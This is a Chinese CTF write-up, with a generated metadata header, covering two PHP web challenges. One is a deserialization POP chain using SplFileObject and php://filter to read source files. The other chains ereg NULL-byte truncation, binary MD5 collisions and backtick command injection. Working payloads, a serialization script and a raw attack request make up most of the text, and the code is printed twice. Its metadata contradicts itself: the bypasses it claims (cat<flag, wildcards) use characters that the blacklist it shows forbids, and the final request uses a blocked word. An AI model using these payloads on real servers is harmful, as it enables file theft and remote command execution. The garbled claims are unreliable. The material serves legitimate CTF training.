---
title: 第二届全国网络安全行业职业技能大赛渗透组赛题解析
contest: 全国网络安全行业职业技能大赛
year: 2025
difficulty: medium
vuln_type: web_unknown
tags:
- Web-反序列化
- POP链
- SPL
- SplFileObject
- php://filter
- RCE
- 黑名单绕
- ereg截断
- md5强类型
attack_chain: 'POP链构造: class A {username=SplFileObject, password=php://filter/read=convert.base64-encode/resource=flag.php}→反序列化触发__wakeup→SplFileObject打开php://filter流→foreach输出base64源码|源码审计+RCE: ereg() NULL截断(9e9%00*-*)+md5强类型碰撞(M%C9h...)+eval(`$cmd`)+黑名单ls/bash/cat/...→ls $IFS/通配符绕'
key_payload: O%3A1%3A%22A%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A13%3A%22SplFileObject%22%3Bs%3A8%3A%22password%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D|?password=9e9%00*-*&cmd=cat%20f1ag098765432.php|a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
one_liner: 渗透组两道题,核心考点是SPL+PHP反序列化POP链构造SplFileObject+php://filter读flag.php源码,以及ereg NULL截断(9e9%00*-*)+md5强类型碰撞+eval(`$cmd`)+黑名单绕组合实现RCE
lesson: 1) PHP反序列化利用SPL类的__construct行为(如SplFileObject接受文件名构造)可构造POP链读取文件; 2) ereg()存在NULL截断漏洞,password=9e9%00*-*绕过^[a-zA-Z0-9]+$匹配,但strlen=4+>9999999利用PHP弱类型比较; 3) md5强类型碰撞用二进制字符串M%C9h...+1字节差异(0x00/0x02); 4) preg_match黑名单含ls/bash/cat等但缺少*号单字符,可用`ls$IFS*`或`cat<flag`; 5) 类A的__wakeup()与__construct()都执行foreach($con as $f) echo $f,反序列化时强制遍历对象
quality: medium
full_path: 第二届全国网络安全行业职业技能大赛渗透组赛题解析.full.md
meta_path: 第二届全国网络安全行业职业技能大赛渗透组赛题解析.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 第二届全国网络安全行业职业技能大赛渗透组赛题解析。渗透组两道题,核心考点是SPL+PHP反序列化POP链构造SplFileObject+php://filter读flag.php源码,以及ereg NULL截断(9e9%00*-*)+md5强类型碰撞+eval(`$cmd`)+黑名单绕组合实现RCE。经验：1) PHP反序列化利用SPL类的__construct行为(如SplFileObje...
category: web
subcategory: web_other
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: industry
wp_url: https://www.ctfiot.com/285298.html
reasoning_chain:
- Web 反序列化题给 PHP 源码 → 触发点：class A __wakeup 触发 foreach echo
- 假设：username=SplFileObject + password=php://filter → 假设：SplFileObject 接受文件名构造
- 动作：反序列化触发 __wakeup → SplFileObject 打开 php://filter 流 → foreach 输出 base64 源码 → 假设：读 flag.php
- 源码审计 RCE 题 → 触发点：ereg() NULL 截断 + md5 强类型碰撞 + eval + 黑名单绕
- 动作：password=9e9%00*-* 绕 ereg（NULL 截断）+ strlen=4 + >9999999 利用 PHP 弱类型比较
- 假设：md5 强类型碰撞 → 动作：a/b=M%C9h%FF%0E... + 1 字节差异（0x00/0x02）→ 触发 == false 但 md5 一致
- 假设：preg_match 黑名单含 ls/bash/cat → 假设：缺少 * 号 → 动作：ls$IFS* 或 cat<flag 通配符绕
- 动作：cmd='cat<flag' → 假设：eval(`$cmd`) → 观察：读 flag
failed_attempts:
- 直接 SplFileObject('/flag') → 失败：必须 php://filter/read=convert.base64-encode 链
- md5_ata 字符串碰撞 → 失败：必须用二进制字节碰撞（M%C9h...）
- preg_match 替换字符 → 失败：必须用通配符绕过
key_observations:
- PHP 反序列化利用 SPL 类（SplFileObject）__construct 行为可构造 POP 链读文件
- ereg() NULL 截断漏洞：9e9%00*-* 绕过 ^[a-zA-Z0-9]+$ 但 strlen=4
- md5 强类型碰撞需二进制字符串 + 1 字节差异（0x00/0x02）
- preg_match 黑名单绕：缺少 * 号单字符可用通配符
- 类 A __wakeup 和 __construct 都执行 foreach 是通用 POP 链入口
prerequisites:
- PHP 反序列化 SPL 类（SplFileObject/SplStack）
- ereg() NULL 截断漏洞
- md5 强类型碰撞（FastColl/MD5Collider）
- preg_match 黑名单通配符绕
---
# 第二届全国网络安全行业职业技能大赛渗透组赛题解析

> 原文: https://www.ctfiot.com/285298.html
> ID: 285298

源码审计

任务描述： 这是一个风景欣赏网站，但其源码中隐藏了不为人知的秘密。

提交要求： 进行简单的代码审计，绕过逻辑判断获取flag并提交。

POP链构造

任务描述： 目标站点使用了SPL进行开发。

提交要求： 利用反序列化漏洞构造POP链，结合SPL特性获取服务器权限或读取flag并提交。

源码:

<?phperror_reporting(0);highlight_file(__FILE__);
class A{    public $username;    public $password;    public function __construct()    {        $this->username = "happy";        $this->password = "super";        $context = new $this->username ($this->password);        var_dump($context);        foreach($context as $f){            echo $f;        }    }
    public function __wakeup()    {        $con = new $this->username ($this->password);        foreach($con as $f){            echo $f;        }    }
}class B{    var $password;    public function __construct($user)    {        $this->password = $user;        echo ("hi ".$this->password);    }}

if(isset($_POST['un'])){    unserialize($_POST['un']);}else{    $demo=new A;
}

<?php

class A{    public $username;    public $password;
}class B{    var $password;}
$obj = new A();$obj->username = "SplFileObject";$obj->password = "php://filter/read=convert.base64-encode/resource=flag.php";

echo urlencode(serialize($obj));

O%3A1%3A%22A%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A13%3A%22SplFileObject%22%3Bs%3A8%3A%22password%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D

<?php    if (isset($_GET['password']) || isset($_GET['cmd']))     {      if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)      {        echo 'You password must be alphanumeric';      }      else if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)       {         if (strpos ($_GET['password'], '*-*') !== FALSE)           {            $cmd = $_GET['cmd'];            if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|'|"|`|;|,|*|?|\|\\|n|t|r|xA0|{|}|(|)|&[^d]|@|||\$|[|]|{|}|(|)|-|<|>/i", $cmd)) {                echo("forbid ~");                echo "
";            } else {                if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {                    echo `$cmd`;                } else {                    echo ("md5 is funny ~");                }            }          }          else          {            echo('*-* have not been found');            }          }         else          {            echo 'Invalid password';           }        }    highlight_file(__FILE__); ?>

if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)

if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)

if (strpos ($_GET['password'], '*-*') !== FALSE)

*-*

if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|'|"|`|;|,|*|?|\|\\|n|t|r|xA0|{|}|(|)|&[^d]|@|||\$|[|]|{|}|(|)|-|<|>/i", $cmd))

if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b']))

9e9%00*-*

POST /?password=9e9%00*-*&cmd=cat%20f1ag098765432.php HTTP/1.1Host: 127.0.0.1Content-Type: application/x-www-form-urlencodedContent-Length: 307
a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2


```
<?phperror_reporting(0);highlight_file(__FILE__);
class A{    public $username;    public $password;    public function __construct()    {        $this->username = "happy";        $this->password = "super";        $context = new $this->username ($this->password);        var_dump($context);        foreach($context as $f){            echo $f;        }    }
    public function __wakeup()    {        $con = new $this->username ($this->password);        foreach($con as $f){            echo $f;        }    }
}class B{    var $password;    public function __construct($user)    {        $this->password = $user;        echo ("hi ".$this->password);    }}

if(isset($_POST['un'])){    unserialize($_POST['un']);}else{    $demo=new A;
}
<?php

class A{    public $username;    public $password;
}class B{    var $password;}
$obj = new A();$obj->username = "SplFileObject";$obj->password = "php://filter/read=convert.base64-encode/resource=flag.php";

echo urlencode(serialize($obj));
O%3A1%3A%22A%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A13%3A%22SplFileObject%22%3Bs%3A8%3A%22password%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D
<?php    if (isset($_GET['password']) || isset($_GET['cmd']))     {      if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)      {        echo 'You password must be alphanumeric';      }      else if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)       {         if (strpos ($_GET['password'], '*-*') !== FALSE)           {            $cmd = $_GET['cmd'];            if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|'|"|`|;|,|*|?|\|\\|n|t|r|xA0|{|}|(|)|&[^d]|@|||\$|[|]|{|}|(|)|-|<|>/i", $cmd)) {                echo("forbid ~");                echo "
";            } else {                if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {                    echo `$cmd`;                } else {                    echo ("md5 is funny ~");                }            }          }          else          {            echo('*-* have not been found');            }          }         else          {            echo 'Invalid password';           }        }    highlight_file(__FILE__); ?>
if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
if (strlen($_GET['password']) < 8 && $_GET['password'] > 9999999)
if (strpos ($_GET['password'], '*-*') !== FALSE)
*-*
if (preg_match("/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|'|"|`|;|,|*|?|\|\\|n|t|r|xA0|{|}|(|)|&[^d]|@|||\$|[|]|{|}|(|)|-|<|>/i", $cmd))
if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b']))
9e9%00*-*
POST /?password=9e9%00*-*&cmd=cat%20f1ag098765432.php HTTP/1.1Host: 127.0.0.1Content-Type: application/x-www-form-urlencodedContent-Length: 307
a=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]